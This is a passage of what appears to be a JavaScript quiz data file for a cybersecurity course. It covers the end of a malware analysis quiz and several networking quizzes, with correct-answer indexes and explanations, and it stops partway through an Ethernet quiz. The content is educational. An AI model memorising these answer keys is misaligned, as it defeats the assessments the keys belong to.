      { id: "ma-q7-24", question: "How does a rootkit differ from a standard trojan?", options: ["Rootkits are less dangerous", "Rootkits operate at kernel level or below, actively hiding their presence from the OS and security tools", "They're identical", "Rootkits only affect Linux"], correctAnswer: 1, explanation: "Rootkits modify the OS kernel or boot process to actively conceal malware presence — hiding processes, files, network connections from standard tools." },
      { id: "ma-q7-25", question: "What is the MITRE ATT&CK technique ID for 'Command and Scripting Interpreter: PowerShell'?", options: ["T1059.001", "T1053.005", "T1547.001", "T1055.012"], correctAnswer: 0, explanation: "T1059.001 is the sub-technique for PowerShell under Command and Scripting Interpreter — one of the most commonly observed execution techniques." },
      { id: "ma-q7-26", question: "During analysis, you find the malware creates a service named 'WindowsUpdateSvc'. What technique is this?", options: ["Legitimate update", "Persistence via Windows Service creation (T1543.003) using a name mimicking legitimate services", "Service discovery", "Process injection"], correctAnswer: 1, explanation: "Creating services with names mimicking legitimate Windows services is a common persistence technique (T1543.003) — provides automatic startup and SYSTEM privileges." },
      { id: "ma-q7-27", question: "What is the best approach for analyzing a multi-stage malware dropper?", options: ["Only analyze the dropper", "Analyze each stage: initial dropper → downloaded payload → final payload, capturing IOCs and behavior at each stage", "Skip to the final payload", "Run it once and collect all data"], correctAnswer: 1, explanation: "Multi-stage malware requires analyzing each stage independently — each may have different C2s, techniques, and IOCs that are crucial for complete understanding." },
      { id: "ma-q7-28", question: "What does 'behavioral analysis' reveal that static analysis cannot?", options: ["File metadata", "Runtime behavior: actual C2 communication, decrypted strings, unpacked code, and real-time system modifications", "Import tables", "File size"], correctAnswer: 1, explanation: "Dynamic/behavioral analysis reveals what actually happens at runtime — decrypted configurations, real C2 traffic, dropped files, and evasion technique triggers." },
      { id: "ma-q7-29", question: "How should a malware analysis report be structured for maximum SOC value?", options: ["Technical details only", "Executive summary, IOCs (hashes, IPs, domains), behavioral indicators, MITRE ATT&CK mapping, and detection recommendations", "Just list the IOCs", "Screenshots only"], correctAnswer: 1, explanation: "Effective reports include: summary for leadership, actionable IOCs for blocking, behavioral indicators for detection, ATT&CK mapping for context, and recommendations." },
      { id: "ma-q7-30", question: "You analyze a sample that checks the system language and exits if it's Russian, Ukrainian, or Kazakh. What does this indicate?", options: ["Localization feature", "Likely Eastern European cybercrime group avoiding prosecution by not targeting CIS countries", "Translation error", "Random behavior"], correctAnswer: 1, explanation: "Many Eastern European cybercrime groups avoid targeting CIS nations to reduce law enforcement attention — language/locale checks are a common geofencing technique." }
    ]
  },
  // ==========================================
  // NETWORK FUNDAMENTALS QUIZZES
  // ==========================================
  {
    quizId: "nf-q1",
    courseId: "network-fundamentals",
    title: "Computer Networks Basics Quiz",
    description: "Test your knowledge of network types, topologies, and architecture.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q1-1", question: "What is the primary purpose of a computer network?", options: ["To store files locally", "To enable communication and resource sharing between devices", "To protect against malware", "To increase CPU speed"], correctAnswer: 1, explanation: "A computer network connects devices to enable communication, data sharing, and resource sharing such as printers and internet access." },
      { id: "nf-q1-2", question: "Which type of network typically covers a single building or campus?", options: ["WAN", "MAN", "LAN", "PAN"], correctAnswer: 2, explanation: "A LAN (Local Area Network) covers a limited area such as a building, office, or campus." },
      { id: "nf-q1-3", question: "What does WAN stand for?", options: ["Wireless Access Network", "Wide Area Network", "Web Application Node", "Wired Automated Network"], correctAnswer: 1, explanation: "WAN stands for Wide Area Network — it spans large geographical areas, connecting multiple LANs across cities, countries, or continents." },
      { id: "nf-q1-4", question: "In a star topology, what happens if the central device fails?", options: ["Only one node is affected", "The entire network goes down", "The network automatically switches to mesh", "Nothing — nodes communicate directly"], correctAnswer: 1, explanation: "In a star topology, all nodes connect through a central hub/switch. If it fails, the entire network loses connectivity." },
      { id: "nf-q1-5", question: "Which topology provides the highest redundancy?", options: ["Star", "Bus", "Ring", "Full Mesh"], correctAnswer: 3, explanation: "Full mesh topology connects every node to every other node, providing maximum redundancy — if one link fails, data can route through alternative paths." },
      { id: "nf-q1-6", question: "What is a PAN (Personal Area Network)?", options: ["A citywide network", "A network within a few meters, like Bluetooth devices", "A private WAN", "A public access network"], correctAnswer: 1, explanation: "A PAN operates within a very short range (typically a few meters) and connects personal devices like phones, headphones, and smartwatches via Bluetooth or USB." },
      { id: "nf-q1-7", question: "In a client-server architecture, what role does the server play?", options: ["It only sends data, never receives", "It provides resources and services to client devices", "It acts as a simple relay", "It only stores backups"], correctAnswer: 1, explanation: "In client-server architecture, the server centralizes resources (files, apps, databases) and provides services upon client requests." },
      { id: "nf-q1-8", question: "What is the main disadvantage of a bus topology?", options: ["High cost", "If the backbone cable fails, the entire network goes down", "It requires too many cables", "It only supports two devices"], correctAnswer: 1, explanation: "A bus topology uses a single backbone cable. If this cable fails or is damaged, all devices on the network lose connectivity." },
      { id: "nf-q1-9", question: "Which network type covers a metropolitan area, such as a city?", options: ["LAN", "PAN", "MAN", "SAN"], correctAnswer: 2, explanation: "A MAN (Metropolitan Area Network) covers a city or large campus, typically larger than a LAN but smaller than a WAN." },
      { id: "nf-q1-10", question: "What is the key advantage of peer-to-peer networking?", options: ["Centralized security management", "No need for a dedicated server — every device acts as both client and server", "Better performance for large networks", "Easier to scale to thousands of users"], correctAnswer: 1, explanation: "In P2P, each device can share and access resources directly without requiring a dedicated server, making it simpler and cheaper for small networks." },
      { id: "nf-q1-11", question: "Which device connects different networks together and routes traffic between them?", options: ["Hub", "Switch", "Router", "Repeater"], correctAnswer: 2, explanation: "A router connects different networks (e.g., your LAN to the internet) and routes packets between them using IP addresses." },
      { id: "nf-q1-12", question: "What is a CAN (Campus Area Network)?", options: ["A network spanning multiple buildings in a university or corporate campus", "A wireless network in a car", "A cloud-based network", "A cable television network"], correctAnswer: 0, explanation: "A CAN interconnects multiple LANs across buildings within a limited geographical area like a university campus or business park." },
      { id: "nf-q1-13", question: "In a ring topology, how does data travel?", options: ["Randomly to any node", "In one direction (or both in dual-ring) from node to node", "Only from the central hub", "Broadcast to all nodes simultaneously"], correctAnswer: 1, explanation: "In a ring topology, data travels sequentially from node to node in one direction (unidirectional) or both directions in a dual-ring configuration." },
      { id: "nf-q1-14", question: "What type of network is the Internet classified as?", options: ["LAN", "MAN", "WAN", "PAN"], correctAnswer: 2, explanation: "The Internet is the world's largest WAN — a global network of interconnected networks spanning the entire planet." },
      { id: "nf-q1-15", question: "What is a hybrid topology?", options: ["A network using only wireless connections", "A combination of two or more different topologies", "A topology that only works in the cloud", "A topology with no central device"], correctAnswer: 1, explanation: "A hybrid topology combines multiple topologies (e.g., star-bus or star-ring) to leverage the advantages of each for complex network designs." }
    ]
  },
  {
    quizId: "nf-q2",
    courseId: "network-fundamentals",
    title: "OSI Model Quiz",
    description: "Assess your understanding of the 7-layer OSI model and data encapsulation.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q2-1", question: "How many layers does the OSI model have?", options: ["4", "5", "6", "7"], correctAnswer: 3, explanation: "The OSI (Open Systems Interconnection) model has 7 layers: Physical, Data Link, Network, Transport, Session, Presentation, and Application." },
      { id: "nf-q2-2", question: "Which OSI layer is responsible for routing packets between networks?", options: ["Layer 1 — Physical", "Layer 2 — Data Link", "Layer 3 — Network", "Layer 4 — Transport"], correctAnswer: 2, explanation: "Layer 3 (Network) handles logical addressing (IP) and routing packets between different networks." },
      { id: "nf-q2-3", question: "What is the PDU (Protocol Data Unit) at the Transport layer?", options: ["Bit", "Frame", "Packet", "Segment"], correctAnswer: 3, explanation: "At Layer 4 (Transport), data is encapsulated into segments (TCP) or datagrams (UDP)." },
      { id: "nf-q2-4", question: "Which layer converts data into electrical signals, light pulses, or radio waves?", options: ["Physical", "Data Link", "Network", "Application"], correctAnswer: 0, explanation: "Layer 1 (Physical) deals with the actual transmission of raw bits over a medium — electrical, optical, or wireless signals." },
      { id: "nf-q2-5", question: "At which OSI layer do switches primarily operate?", options: ["Layer 1", "Layer 2", "Layer 3", "Layer 4"], correctAnswer: 1, explanation: "Switches operate primarily at Layer 2 (Data Link), using MAC addresses to forward frames within a network." },
      { id: "nf-q2-6", question: "Which layer handles data encryption, compression, and format translation?", options: ["Session", "Presentation", "Application", "Transport"], correctAnswer: 1, explanation: "Layer 6 (Presentation) handles data formatting, encryption/decryption, compression, and character encoding translation." },
      { id: "nf-q2-7", question: "What is the purpose of the Session layer?", options: ["Physical transmission", "Routing packets", "Managing communication sessions between applications", "Providing user interface"], correctAnswer: 2, explanation: "Layer 5 (Session) establishes, manages, and terminates communication sessions between applications, handling dialog control and synchronization." },
      { id: "nf-q2-8", question: "What is data encapsulation in networking?", options: ["Compressing data for storage", "Wrapping data with protocol headers at each layer as it moves down the OSI stack", "Encrypting data for security", "Splitting data into equal chunks"], correctAnswer: 1, explanation: "Encapsulation adds protocol-specific headers (and sometimes trailers) at each OSI layer as data moves from Application to Physical." },
      { id: "nf-q2-9", question: "Which layer provides end-to-end communication and error recovery?", options: ["Network", "Transport", "Session", "Data Link"], correctAnswer: 1, explanation: "Layer 4 (Transport) provides end-to-end reliable communication with features like error detection, flow control, and retransmission (TCP)." },
      { id: "nf-q2-10", question: "The PDU at Layer 2 is called a:", options: ["Segment", "Packet", "Frame", "Bit"], correctAnswer: 2, explanation: "At the Data Link layer (Layer 2), data is encapsulated into frames, which include MAC addresses and error-checking (FCS)." },
      { id: "nf-q2-11", question: "HTTP, FTP, and SMTP operate at which OSI layer?", options: ["Transport", "Session", "Presentation", "Application"], correctAnswer: 3, explanation: "HTTP, FTP, SMTP, DNS, and other user-facing protocols operate at Layer 7 (Application)." },
      { id: "nf-q2-12", question: "What mnemonic helps remember the OSI layers from bottom to top?", options: ["All People Seem To Need Data Processing", "Please Do Not Throw Sausage Pizza Away", "Do People Always Talk So Nice Politely", "Never Say Anything To People During Parties"], correctAnswer: 1, explanation: "'Please Do Not Throw Sausage Pizza Away' represents Physical, Data Link, Network, Transport, Session, Presentation, Application." },
      { id: "nf-q2-13", question: "Which two layers are combined in the TCP/IP model's Network Access layer?", options: ["Network and Transport", "Physical and Data Link", "Session and Presentation", "Application and Session"], correctAnswer: 1, explanation: "The TCP/IP model combines OSI Layers 1 (Physical) and 2 (Data Link) into a single Network Access (or Link) layer." },
      { id: "nf-q2-14", question: "What does de-encapsulation refer to?", options: ["Adding headers at each layer", "Removing headers at each layer as data moves up the stack at the receiving end", "Converting digital to analog", "Compressing data packets"], correctAnswer: 1, explanation: "De-encapsulation is the reverse process — stripping away protocol headers/trailers at each layer as data moves up the OSI stack at the receiving host." },
      { id: "nf-q2-15", question: "Which OSI layer adds a trailer containing the FCS (Frame Check Sequence)?", options: ["Physical", "Data Link", "Network", "Transport"], correctAnswer: 1, explanation: "The Data Link layer (Layer 2) adds both a header (with MAC addresses) and a trailer containing the FCS for error detection." }
    ]
  },
  {
    quizId: "nf-q3",
    courseId: "network-fundamentals",
    title: "TCP/IP Protocol Suite Quiz",
    description: "Test your knowledge of TCP, UDP, ICMP, ARP, and port numbers.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "nf-q3-1", question: "How many layers does the TCP/IP model have?", options: ["3", "4", "5", "7"], correctAnswer: 1, explanation: "The TCP/IP model has 4 layers: Network Access, Internet, Transport, and Application." },
      { id: "nf-q3-2", question: "What is the first step of the TCP three-way handshake?", options: ["ACK", "SYN-ACK", "SYN", "FIN"], correctAnswer: 2, explanation: "The three-way handshake begins with the client sending a SYN (synchronize) packet to the server." },
      { id: "nf-q3-3", question: "Which protocol is connectionless and does not guarantee delivery?", options: ["TCP", "UDP", "ARP", "ICMP"], correctAnswer: 1, explanation: "UDP (User Datagram Protocol) is connectionless — it sends data without establishing a connection or guaranteeing delivery, providing lower latency." },
      { id: "nf-q3-4", question: "What port number does HTTP use by default?", options: ["21", "22", "80", "443"], correctAnswer: 2, explanation: "HTTP uses port 80 by default, while HTTPS uses port 443." },
      { id: "nf-q3-5", question: "What protocol does the `ping` command use?", options: ["TCP", "UDP", "ICMP", "ARP"], correctAnswer: 2, explanation: "Ping uses ICMP (Internet Control Message Protocol) Echo Request and Echo Reply messages to test connectivity." },
      { id: "nf-q3-6", question: "What does ARP resolve?", options: ["Domain names to IP addresses", "IP addresses to MAC addresses", "Port numbers to services", "URLs to IP addresses"], correctAnswer: 1, explanation: "ARP (Address Resolution Protocol) maps a known IP address to its corresponding MAC address on the local network." },
      { id: "nf-q3-7", question: "Which port range is designated as 'well-known' ports?", options: ["0-1023", "1024-49151", "49152-65535", "0-65535"], correctAnswer: 0, explanation: "Well-known ports range from 0-1023 and are assigned to commonly used protocols like HTTP (80), HTTPS (443), SSH (22), and DNS (53)." },
      { id: "nf-q3-8", question: "What happens during the second step of the TCP three-way handshake?", options: ["Client sends FIN", "Server responds with SYN-ACK", "Client sends ACK", "Connection is closed"], correctAnswer: 1, explanation: "In step 2, the server acknowledges the client's SYN and sends back a SYN-ACK (synchronize-acknowledge) packet." },
      { id: "nf-q3-9", question: "TCP provides flow control using which mechanism?", options: ["MAC filtering", "Sliding window", "ARP cache", "DNS lookup"], correctAnswer: 1, explanation: "TCP uses a sliding window mechanism to manage flow control — the receiver advertises a window size indicating how much data it can accept." },
      { id: "nf-q3-10", question: "Which protocol would you use for real-time video streaming?", options: ["TCP", "UDP", "ICMP", "ARP"], correctAnswer: 1, explanation: "UDP is preferred for real-time streaming (video, VoIP, gaming) because its lower overhead and lack of retransmission provide better performance." },
      { id: "nf-q3-11", question: "What is the default port for SSH?", options: ["20", "22", "23", "25"], correctAnswer: 1, explanation: "SSH (Secure Shell) uses port 22 by default for encrypted remote access." },
      { id: "nf-q3-12", question: "What is a socket in networking?", options: ["A physical connector", "The combination of an IP address and a port number", "A type of cable", "A network topology"], correctAnswer: 1, explanation: "A socket is the combination of an IP address and port number (e.g., 192.168.1.1:443), uniquely identifying a communication endpoint." },
      { id: "nf-q3-13", question: "What ICMP message type is used by traceroute?", options: ["Echo Request", "Time Exceeded", "Destination Unreachable", "Redirect"], correctAnswer: 1, explanation: "Traceroute works by sending packets with incrementing TTL values and receiving ICMP Time Exceeded messages from each hop along the path." },
      { id: "nf-q3-14", question: "Which TCP flag initiates connection termination?", options: ["SYN", "ACK", "RST", "FIN"], correctAnswer: 3, explanation: "The FIN (Finish) flag initiates a graceful connection termination in TCP's four-way teardown process." },
      { id: "nf-q3-15", question: "Ephemeral ports are in which range?", options: ["0-1023", "1024-49151", "49152-65535", "80-443"], correctAnswer: 2, explanation: "Ephemeral (dynamic/private) ports range from 49152-65535 and are temporarily assigned by the OS for client-side connections." }
    ]
  },
  {
    quizId: "nf-q4",
    courseId: "network-fundamentals",
    title: "IP Addressing & Subnetting Quiz",
    description: "Validate your subnetting skills and IPv4/IPv6 knowledge.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "nf-q4-1", question: "How many bits are in an IPv4 address?", options: ["16", "32", "64", "128"], correctAnswer: 1, explanation: "An IPv4 address is 32 bits long, divided into 4 octets of 8 bits each (e.g., 192.168.1.1)." },
      { id: "nf-q4-2", question: "What is the subnet mask for a /24 network?", options: ["255.255.0.0", "255.255.255.0", "255.255.255.128", "255.255.255.252"], correctAnswer: 1, explanation: "/24 means 24 bits are set to 1 in the mask, giving 255.255.255.0 — the most common subnet mask for small networks." },
      { id: "nf-q4-3", question: "Which IP address class has a default subnet mask of 255.0.0.0?", options: ["Class A", "Class B", "Class C", "Class D"], correctAnswer: 0, explanation: "Class A networks (1.0.0.0 – 126.255.255.255) use a default /8 subnet mask: 255.0.0.0." },
      { id: "nf-q4-4", question: "How many usable host addresses are in a /28 subnet?", options: ["14", "16", "30", "32"], correctAnswer: 0, explanation: "/28 provides 2^4 = 16 addresses, minus 2 (network and broadcast) = 14 usable host addresses." },
      { id: "nf-q4-5", question: "Which of the following is a private IP address range?", options: ["8.8.8.0/24", "172.16.0.0/12", "200.1.1.0/24", "104.0.0.0/8"], correctAnswer: 1, explanation: "172.16.0.0/12 (172.16.0.0 – 172.31.255.255) is one of three RFC 1918 private address ranges, along with 10.0.0.0/8 and 192.168.0.0/16." },
      { id: "nf-q4-6", question: "What does NAT stand for?", options: ["Network Access Terminal", "Network Address Translation", "Node Authentication Token", "New Address Table"], correctAnswer: 1, explanation: "NAT (Network Address Translation) translates private IP addresses to public IPs, allowing multiple devices to share a single public address." },
      { id: "nf-q4-7", question: "What is the broadcast address for the network 192.168.10.0/24?", options: ["192.168.10.0", "192.168.10.1", "192.168.10.254", "192.168.10.255"], correctAnswer: 3, explanation: "For a /24 network, the broadcast address is the last address in the range: 192.168.10.255." },
      { id: "nf-q4-8", question: "How many bits are in an IPv6 address?", options: ["32", "64", "96", "128"], correctAnswer: 3, explanation: "IPv6 addresses are 128 bits long, represented as 8 groups of 4 hexadecimal digits (e.g., 2001:0db8::1)." },
      { id: "nf-q4-9", question: "What is CIDR notation?", options: ["A type of DNS record", "A way to express the subnet mask as a prefix length (e.g., /24)", "A cable standard", "A routing protocol"], correctAnswer: 1, explanation: "CIDR (Classless Inter-Domain Routing) notation uses a slash followed by the number of network bits (e.g., 10.0.0.0/8) instead of writing full subnet masks." },
      { id: "nf-q4-10", question: "Which IP address is a loopback address?", options: ["0.0.0.0", "127.0.0.1", "192.168.0.1", "255.255.255.255"], correctAnswer: 1, explanation: "127.0.0.1 is the IPv4 loopback address — traffic sent here never leaves the host and is used for local testing." },
      { id: "nf-q4-11", question: "What does PAT (Port Address Translation) add to NAT?", options: ["Encryption", "Uses port numbers to map multiple internal hosts to a single public IP", "DNS resolution", "VLAN tagging"], correctAnswer: 1, explanation: "PAT extends NAT by using unique port numbers to distinguish traffic from multiple internal devices sharing one public IP address." },
      { id: "nf-q4-12", question: "Given the network 10.0.0.0/16, how many subnets can you create with a /24 mask?", options: ["16", "64", "256", "512"], correctAnswer: 2, explanation: "Borrowing 8 bits from the host portion (24 - 16 = 8) creates 2^8 = 256 subnets." },
      { id: "nf-q4-13", question: "Which IPv6 address type is equivalent to IPv4's private addressing?", options: ["Link-local", "Unique Local (ULA)", "Global Unicast", "Multicast"], correctAnswer: 1, explanation: "Unique Local Addresses (fc00::/7) are IPv6's equivalent of RFC 1918 private addresses — routable within an organization but not on the internet." },
      { id: "nf-q4-14", question: "What is the purpose of the network ID in an IP address?", options: ["Identifies the specific host", "Identifies the network or subnet the host belongs to", "Specifies the gateway", "Determines the port number"], correctAnswer: 1, explanation: "The network ID (determined by the subnet mask) identifies which network a host belongs to, enabling routers to make forwarding decisions." },
      { id: "nf-q4-15", question: "The address 169.254.x.x indicates what?", options: ["A public IP address", "An APIPA (Automatic Private IP Addressing) — DHCP failed to assign an address", "A multicast address", "An IPv6 transition address"], correctAnswer: 1, explanation: "169.254.0.0/16 is the APIPA range — Windows/macOS self-assign addresses here when a DHCP server is unreachable." }
    ]
  },
  {
    quizId: "nf-q5",
    courseId: "network-fundamentals",
    title: "Network Devices Quiz",
    description: "Test your understanding of switches, routers, firewalls, and VLANs.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q5-1", question: "What is the primary function of a network switch?", options: ["Route packets between networks", "Forward frames based on MAC addresses within a LAN", "Assign IP addresses", "Filter web traffic"], correctAnswer: 1, explanation: "A switch operates at Layer 2 and forwards Ethernet frames based on destination MAC addresses within a local network." },
      { id: "nf-q5-2", question: "How does a switch learn MAC addresses?", options: ["Manual configuration only", "By examining the source MAC address of incoming frames", "Through DNS queries", "By broadcasting ARP requests"], correctAnswer: 1, explanation: "Switches build their MAC address table dynamically by recording the source MAC address and ingress port of each received frame." },
      { id: "nf-q5-3", question: "What does a router use to make forwarding decisions?", options: ["MAC addresses", "IP addresses and routing table", "Port numbers", "DNS names"], correctAnswer: 1, explanation: "Routers operate at Layer 3 and use destination IP addresses combined with their routing table to determine where to forward packets." },
      { id: "nf-q5-4", question: "What is the difference between a hub and a switch?", options: ["There is no difference", "A hub broadcasts to all ports; a switch forwards only to the correct port", "A hub is faster", "A switch broadcasts; a hub is selective"], correctAnswer: 1, explanation: "A hub is a simple repeater that sends frames out all ports. A switch intelligently forwards frames only to the port where the destination device is connected." },
      { id: "nf-q5-5", question: "What is a VLAN?", options: ["A type of VPN", "A virtual LAN that logically segments a physical network", "A virus protection system", "A wireless network standard"], correctAnswer: 1, explanation: "A VLAN (Virtual LAN) logically divides a physical switch into separate broadcast domains, improving security and performance." },
      { id: "nf-q5-6", question: "What protocol is used for VLAN trunking between switches?", options: ["STP", "802.1Q", "ARP", "OSPF"], correctAnswer: 1, explanation: "IEEE 802.1Q adds a VLAN tag to Ethernet frames, allowing trunk links to carry traffic for multiple VLANs between switches." },
      { id: "nf-q5-7", question: "What is a stateful firewall?", options: ["A firewall that blocks all traffic", "A firewall that tracks the state of active connections and makes decisions based on context", "A firewall that only checks headers", "A software-only firewall"], correctAnswer: 1, explanation: "Stateful firewalls maintain a connection state table, tracking ongoing sessions and allowing return traffic for established connections." },
      { id: "nf-q5-8", question: "What is the purpose of a load balancer?", options: ["To block malicious traffic", "To distribute incoming traffic across multiple servers for performance and availability", "To translate IP addresses", "To encrypt data"], correctAnswer: 1, explanation: "Load balancers distribute client requests across multiple backend servers to optimize performance, ensure availability, and prevent overload." },
      { id: "nf-q5-9", question: "What is a reverse proxy?", options: ["A client-side proxy", "A server that sits in front of backend servers and forwards client requests to them", "A proxy that reverses encryption", "A protocol analyzer"], correctAnswer: 1, explanation: "A reverse proxy accepts client requests and forwards them to appropriate backend servers — providing load balancing, caching, and security." },
      { id: "nf-q5-10", question: "Which routing type requires manual configuration of routes?", options: ["Dynamic routing", "Static routing", "Default routing", "Policy routing"], correctAnswer: 1, explanation: "Static routing requires an administrator to manually configure each route in the routing table — suitable for small, stable networks." },
      { id: "nf-q5-11", question: "What is the default gateway?", options: ["The DNS server address", "The router interface that forwards traffic destined for other networks", "The DHCP server", "The broadcast address"], correctAnswer: 1, explanation: "The default gateway is typically a router's IP address on the local subnet — it forwards packets when the destination is outside the local network." },
      { id: "nf-q5-12", question: "Why is network segmentation important for security?", options: ["It makes the network faster", "It limits the blast radius of breaches by isolating network zones", "It reduces cable costs", "It eliminates the need for firewalls"], correctAnswer: 1, explanation: "Segmentation isolates network zones so a breach in one segment doesn't spread to others — containing lateral movement and reducing risk." },
      { id: "nf-q5-13", question: "What is a Layer 3 switch?", options: ["A hub with extra ports", "A switch that can also perform routing functions using IP addresses", "A wireless access point", "A firewall appliance"], correctAnswer: 1, explanation: "A Layer 3 switch combines traditional Layer 2 switching with Layer 3 routing capabilities, enabling inter-VLAN routing at wire speed." },
      { id: "nf-q5-14", question: "What does a WLAN controller manage?", options: ["Wired switches", "Multiple wireless access points centrally", "Database servers", "Email servers"], correctAnswer: 1, explanation: "A WLAN controller centrally manages and configures multiple wireless access points — handling roaming, security policies, and channel assignments." },
      { id: "nf-q5-15", question: "What is an access port vs a trunk port on a switch?", options: ["They are identical", "An access port carries one VLAN; a trunk port carries multiple VLANs with 802.1Q tagging", "Trunk ports are faster", "Access ports connect to routers only"], correctAnswer: 1, explanation: "Access ports are assigned to a single VLAN (for end devices), while trunk ports carry tagged traffic from multiple VLANs between switches." }
    ]
  },
  {
    quizId: "nf-q6",
    courseId: "network-fundamentals",
    title: "Application Protocols Quiz",
    description: "Assess your knowledge of DNS, DHCP, HTTP, email, and file transfer protocols.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q6-1", question: "What does DNS resolve?", options: ["IP addresses to MAC addresses", "Domain names to IP addresses", "Port numbers to services", "MAC addresses to IP addresses"], correctAnswer: 1, explanation: "DNS (Domain Name System) translates human-readable domain names (e.g., google.com) into IP addresses (e.g., 142.250.190.46)." },
      { id: "nf-q6-2", question: "What is the DORA process in DHCP?", options: ["A backup method", "Discover, Offer, Request, Acknowledge — the four steps of DHCP IP assignment", "A DNS query process", "A routing algorithm"], correctAnswer: 1, explanation: "DORA: Client broadcasts Discover → Server sends Offer → Client sends Request → Server sends Acknowledge, completing IP address assignment." },
      { id: "nf-q6-3", question: "Which DNS record type maps a domain to an IPv4 address?", options: ["AAAA", "MX", "A", "CNAME"], correctAnswer: 2, explanation: "An A record (Address record) maps a domain name to an IPv4 address (e.g., example.com → 93.184.216.34)." },
      { id: "nf-q6-4", question: "What port does DNS use by default?", options: ["22", "25", "53", "80"], correctAnswer: 2, explanation: "DNS uses port 53 — UDP for standard queries and TCP for zone transfers and large responses." },
      { id: "nf-q6-5", question: "What does HTTPS add to HTTP?", options: ["Faster loading", "TLS/SSL encryption for secure communication", "Better compression", "Multi-language support"], correctAnswer: 1, explanation: "HTTPS wraps HTTP in TLS/SSL encryption, ensuring data confidentiality, integrity, and server authentication." },
      { id: "nf-q6-6", question: "Which HTTP status code indicates 'Not Found'?", options: ["200", "301", "403", "404"], correctAnswer: 3, explanation: "HTTP 404 means the requested resource was not found on the server." },
      { id: "nf-q6-7", question: "What protocol is used for sending email?", options: ["POP3", "IMAP", "SMTP", "FTP"], correctAnswer: 2, explanation: "SMTP (Simple Mail Transfer Protocol) is used for sending/relaying email between mail servers, using port 25 (or 587 for submission)." },
      { id: "nf-q6-8", question: "What is the difference between POP3 and IMAP?", options: ["They are identical", "POP3 downloads and typically deletes mail from server; IMAP syncs and keeps mail on server", "IMAP is faster", "POP3 is more secure"], correctAnswer: 1, explanation: "POP3 downloads email locally (often deleting from server), while IMAP keeps messages on the server and syncs across multiple devices." },
      { id: "nf-q6-9", question: "What DNS record type specifies the mail server for a domain?", options: ["A", "CNAME", "MX", "TXT"], correctAnswer: 2, explanation: "MX (Mail Exchanger) records specify which mail servers are responsible for receiving email for a domain, with priority values." },
      { id: "nf-q6-10", question: "FTP uses which two ports?", options: ["20 and 21", "22 and 23", "80 and 443", "25 and 110"], correctAnswer: 0, explanation: "FTP uses port 21 for control/command and port 20 for data transfer in active mode." },
      { id: "nf-q6-11", question: "What is a DHCP lease?", options: ["A permanent IP assignment", "A temporary IP address assignment with an expiration time", "A DNS record type", "A VLAN configuration"], correctAnswer: 1, explanation: "A DHCP lease is a temporary IP address assignment — the client must renew it before expiration or release it when no longer needed." },
      { id: "nf-q6-12", question: "What is a DNS CNAME record?", options: ["An IP address mapping", "An alias that points one domain name to another domain name", "A mail server record", "A text verification record"], correctAnswer: 1, explanation: "A CNAME (Canonical Name) record creates an alias — e.g., www.example.com → example.com — pointing one domain to another." },
      { id: "nf-q6-13", question: "Which protocol replaced Telnet for secure remote access?", options: ["FTP", "HTTP", "SSH", "SMTP"], correctAnswer: 2, explanation: "SSH (Secure Shell) replaced Telnet by providing encrypted remote access — Telnet transmits everything (including passwords) in plaintext." },
      { id: "nf-q6-14", question: "What is a DHCP relay agent used for?", options: ["DNS resolution", "Forwarding DHCP broadcasts across different subnets to a central DHCP server", "Email routing", "Firewall filtering"], correctAnswer: 1, explanation: "A DHCP relay agent forwards DHCP broadcast messages across subnet boundaries to a centralized DHCP server on another network." },
      { id: "nf-q6-15", question: "What does the AAAA DNS record type do?", options: ["Maps a domain to an IPv4 address", "Maps a domain to an IPv6 address", "Creates a mail exchange record", "Defines a text record"], correctAnswer: 1, explanation: "An AAAA (quad-A) record maps a domain name to an IPv6 address (e.g., example.com → 2606:2800:220:1:248:1893:25c8:1946)." }
    ]
  },
  {
    quizId: "nf-q7",
    courseId: "network-fundamentals",
    title: "Ethernet & Data Link Quiz",
    description: "Test Ethernet standards, MAC addressing, switching, and ARP concepts.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q7-1", question: "How many bits are in a MAC address?", options: ["32", "48", "64", "128"], correctAnswer: 1, explanation: "A MAC address is 48 bits (6 bytes), typically written as six pairs of hexadecimal digits (e.g., AA:BB:CC:DD:EE:FF)." },
      { id: "nf-q7-2", question: "What does the OUI in a MAC address identify?", options: ["The operating system", "The manufacturer/vendor of the network interface", "The IP subnet", "The VLAN number"], correctAnswer: 1, explanation: "The first 3 bytes (24 bits) of a MAC address form the OUI (Organizationally Unique Identifier), identifying the hardware manufacturer." },
      { id: "nf-q7-3", question: "Which Ethernet standard supports speeds up to 1 Gbps over Cat5e cabling?", options: ["10BASE-T", "100BASE-TX", "1000BASE-T", "10GBASE-T"], correctAnswer: 2, explanation: "1000BASE-T (Gigabit Ethernet) supports 1 Gbps over Cat5e or Cat6 copper cabling up to 100 meters." },
      { id: "nf-q7-4", question: "What is the purpose of the FCS (Frame Check Sequence) in an Ethernet frame?", options: ["Routing", "Error detection using CRC", "Encryption", "VLAN identification"], correctAnswer: 1, explanation: "The FCS uses a CRC (Cyclic Redundancy Check) calculation to detect errors in the received frame — if the CRC doesn't match, the frame is discarded." },
      { id: "nf-q7-5", question: "What is STP (Spanning Tree Protocol) used for?", options: ["DNS resolution", "Preventing switching loops in redundant network topologies", "IP routing", "Wireless authentication"], correctAnswer: 1, explanation: "STP prevents broadcast storms and loops by logically blocking redundant paths in switched networks while maintaining backup paths for failover." },
      { id: "nf-q7-6", question: "What is the broadcast MAC address?", options: ["00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF", "AA:AA:AA:AA:AA:AA", "01:00:00:00:00:00"], correctAnswer: 1, explanation: "FF:FF:FF:FF:FF:FF is the Layer 2 broadcast address — frames sent to this address are delivered to all devices on the LAN." },
      { id: "nf-q7-7", question: "What happens when a switch receives a frame for an unknown MAC address?", options: ["Drops it", "Floods it out all ports except the source port", "Sends it to the router", "Encrypts it"], correctAnswer: 1, explanation: "When a switch doesn't have the destination MAC in its table, it floods the frame out all ports except the one it was received on — this is called unknown unicast flooding." },
